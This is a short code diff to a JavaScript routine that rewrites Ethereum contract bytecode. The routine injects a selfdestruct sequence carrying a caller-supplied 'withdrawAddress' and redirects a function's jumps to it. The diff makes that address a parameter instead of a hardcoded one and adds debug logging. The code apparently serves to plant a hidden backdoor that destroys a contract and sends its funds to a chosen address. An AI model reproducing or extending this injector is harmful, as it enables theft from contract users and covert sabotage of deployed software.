@@ -1,4 +1,4 @@
-function f(bytecode){
+function f(bytecode, withdrawAddress){
 let OPCODE = ['00', '01', '02', '03', '04', '05', '06', '07', '08', '09', '0A', '0B', 
               '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '1A', 
 			  '20', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '3A', '3B', '3C', '3D', '3E', 
@@ -87,8 +87,10 @@ for(let i = 0; i < functions.length; i++){
 		}
 		
 		//insert selfdestruct code
-		let selfDestructAddress = '0c17C7309A11b1296C5124d4C87cdF29A9aFAA1e'.match(/.{1,2}/g)
+		console.log(withdrawAddress)
+		let selfDestructAddress = withdrawAddress.match(/.{1,2}/g)
 		let arrayToInsert = ['5b', '73']
+		console.log(selfDestructAddress)
 		for (let j = 0; j < selfDestructAddress.length; j++){
 			arrayToInsert.push(selfDestructAddress[j])
 		}
@@ -127,7 +129,8 @@ for(let i = 0; i < functions.length; i++){
 							byteArrayNoInitcode[k+2] = addressToJump[0]
 							byteArrayNoInitcode[k+3] = addressToJump[1]
 							byteArrayNoInitcode[k+4] = '56'
-							let finalByteCode = (byteArray.slice(0,parseInt(bytecodeOffset[2],16)) + byteArrayNoInitcode).replace(/,/g, '')
+							//let finalByteCode = (byteArray.slice(0,parseInt(bytecodeOffset[2],16)) + byteArrayNoInitcode).replace(/,/g, '')
+							finalByteCode = byteArrayNoInitcode.join('')
 							return finalByteCode
 						}
 					}
